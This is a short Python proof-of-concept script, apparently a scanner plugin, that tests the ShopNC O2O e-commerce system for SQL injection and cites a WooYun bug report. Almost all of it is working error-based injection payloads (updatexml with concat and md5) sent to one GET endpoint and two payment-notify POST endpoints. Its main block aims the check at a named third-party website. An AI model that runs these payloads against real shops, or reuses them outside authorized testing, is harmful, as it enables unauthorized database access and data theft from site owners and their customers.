#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: shopnc o2o版两处SQL注入打包#2 
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0125517
#Author:xq17
import re
def assign(service, arg):
    if service == 'shopnc':
        return True, arg
def audit(arg):
    payload ='circle/index.php?op=check_circle_name&name[0]=exp&name[1]=1)%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23--'       
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)  
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
        security_hole(target)
    post='out_trade_no%5B0%5D=exp&out_trade_no%5B1%5D=%20%201=1%20and%20(updatexml(1,concat(0x3a,(select%20md5(1))),1))'
    target=arg+'index.php?act=payment&op=notify'
    code, head, res, errcode, _ = curl.curl2(target,post=post) 
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
        security_hole(target)
    target=arg+'index.php?act=predeposit_payment&op=notify'
    code, head, res, errcode, _ = curl.curl2(target,post=post) 
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('shopnc', 'http://www.0795hui.com/')[1])